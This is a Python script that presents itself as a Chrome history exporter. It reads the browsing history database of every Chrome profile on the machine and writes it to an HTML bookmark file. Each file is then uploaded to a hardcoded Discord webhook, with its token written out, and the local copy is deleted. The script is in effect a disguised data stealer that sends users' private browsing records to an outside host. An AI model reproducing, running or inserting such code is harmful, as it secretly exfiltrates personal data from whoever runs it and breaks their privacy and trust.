#!/usr/bin/env python

from __future__ import print_function
import os
import sqlite3
import requests
from shutil import copy, rmtree
from platform import system
from tempfile import mkdtemp
from datetime import datetime, timedelta

script_version = "2.0.2"

html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&#39;",
    ">": "&gt;",
    "<": "&lt;",
}

output_file_template = """<!DOCTYPE NETSCAPE-Bookmark-file-1>

<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
<title>Bookmarks</title>
<h1>Bookmarks</h1>

<dl><p>
<dl><dt><h3>History</h3>

<dl><p>{items}</dl></p>\n</dl>"""

def html_escape(text):
    return ''.join(html_escape_table.get(c, c) for c in text)

def sanitize(string):
    res = ''
    string = html_escape(string)
    for i in range(len(string)):
        if ord(string[i]) > 127:
            res += '&#x{:x};'.format(ord(string[i]))
        else:
            res += string[i]
    return res

def get_chrome_history_paths():
    profile_paths = []
    if system() == "Darwin":
        base_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/")
    elif system() == "Linux":
        base_path = os.path.expanduser("~/.config/google-chrome/")
    elif system() == "Windows":
        base_path = os.environ["LOCALAPPDATA"] + r"\Google\Chrome\User Data"
    else:
        print(f'Your system ("{system()}") is not recognized.')
        exit(1)
    
    for profile in os.listdir(base_path):
        history_path = os.path.join(base_path, profile, "History")
        if os.path.exists(history_path):
            profile_paths.append((profile, history_path))
    
    return profile_paths

def send_to_discord(file_path, webhook_url):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print(f"File {file_path} sent successfully to Discord.")
        else:
            print(f"Failed to send file: {response.status_code}, {response.text}")

def export_chrome_history():
    profile_histories = get_chrome_history_paths()
    webhook_url = "https://discord.com/api/webhooks/1339115779378909225/chwx5uEJez8NlBd3YytZqDZ7OCyH8-NBhkM6EsNY15F0WTFLcLYREpOF8DkjNMHl6zbd"
    
    for profile, input_filename in profile_histories:
        output_filename = f"history_{profile}.html"
        
        temp_dir = mkdtemp(prefix='export-chrome-history-')
        copied_file = os.path.join(temp_dir, 'History')
        copy(input_filename, copied_file)

        try:
            connection = sqlite3.connect(copied_file)
        except sqlite3.OperationalError:
            print(f'The file "{input_filename}" could not be opened for reading.')
            rmtree(temp_dir)
            continue

        curs = connection.cursor()
        try:
            curs.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
        except sqlite3.OperationalError:
            print(f'Error reading data from "{input_filename}".')
            rmtree(temp_dir)
            continue

        items = ""
        for row in curs:
            if len(row[1]) > 0:
                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=row[2])
                formatted_time = timestamp.strftime('%Y-%m-%d %H:%M:%S')
                items += f'<dt><a href="{sanitize(row[0])}">{sanitize(row[1])}</a> ({formatted_time})\n'
        
        connection.close()
        rmtree(temp_dir)
        
        with open(output_filename, "w", encoding="utf-8") as output_file:
            output_file.write(output_file_template.format(items=items))
        
        print(f"History exported to {output_filename}")
        send_to_discord(output_filename, webhook_url)
        
        try:
            os.remove(output_filename)
            print(f"Deleted {output_filename} after sending to Discord.")
        except OSError as e:
            print(f"Error deleting {output_filename}: {e}")

if __name__ == "__main__":
    export_chrome_history()
